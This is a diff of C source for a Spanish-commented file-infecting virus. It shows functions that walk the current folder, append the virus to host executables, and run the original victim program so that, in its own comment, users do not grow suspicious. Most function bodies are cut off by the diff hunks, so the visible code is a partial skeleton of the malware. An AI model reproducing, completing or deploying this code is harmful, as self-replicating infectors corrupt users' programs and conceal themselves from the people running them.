@@ -1,18 +1,12 @@
 #include<stdio.h>
 #include<io.h>
-#include<direct.h>
-#include<conio.h>
-#include<time.h>
 #include <stdlib.h>
 #include <string.h>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <unistd.h>
 #include <dirent.h>
+//Exit0o!
+int tamVirus=44249; //Tamaño fijo para saber cuando se ejecuta un programa infectado o el virus
 
-int tamVirus=44249;
-
-int printTam(char *str){
+int printTam(char *str){ //Funcion que te devuelve el tamaño del nombre de archivo q le pases
   FILE *virus;
   virus=fopen(str,"rb"); //Virus
   int size=0;
@@ -22,7 +16,7 @@ int printTam(char *str){
   return size;
 }
 
-void dameParaInfectar(char*hostingName){
+void dameParaInfectar(char*hostingName){//Funcion que recibe un programa host donde se le agregara el virus
   //char *nombreParaBorrar=hostingName;
   printf("Estoy infectado a: \n");
   printf(hostingName);
@@ -68,7 +62,7 @@ void dameParaInfectar(char*hostingName){
 }
 
 
-void infectar(){
+void infectar(){ //Funcion que recorre la carpeta en q se encuentre el virus
   //st=clock();
   printf("Ah infectaaaaar");
   struct dirent *de;
@@ -89,7 +83,7 @@ void infectar(){
   closedir(dr);
 }
 
-void ejecutarVictima(char *miNombre){
+void ejecutarVictima(char *miNombre){ //Si soy un programa infectado me tengo q ejecutar para que no sospechen
   int currentTam=printTam(miNombre);
   if(currentTam>tamVirus){  
     
@@ -129,7 +123,7 @@ int main(int argc, char** argv){
   printf("Tam: %d",t);
   */
   //infectar();
-  ejecutarVictima(argv[0]);
+  ejecutarVictima(argv[0]); //Al ejecutar la victima compruebo si soy un virus o un programa infectado
   //dameParaInfectar("git.exe");
   //getch();
   return 0;
